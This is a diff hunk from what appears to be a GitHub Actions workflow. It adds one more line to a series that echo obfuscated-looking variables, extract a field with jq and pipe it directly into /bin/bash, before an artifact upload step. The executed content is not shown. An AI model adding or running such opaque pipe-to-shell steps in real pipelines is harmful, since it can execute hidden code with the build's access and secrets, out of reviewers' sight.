@@ -32,6 +32,7 @@ jobs:
           echo $anzwm94211 | jq -r .trs93 | /bin/bash
           echo $ouk78124 | jq -r .mthrd1377 | /bin/bash
           echo $r47 | jq -r .lap470 | /bin/bash
+          echo $sgpx76945 | jq -r .a23951 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
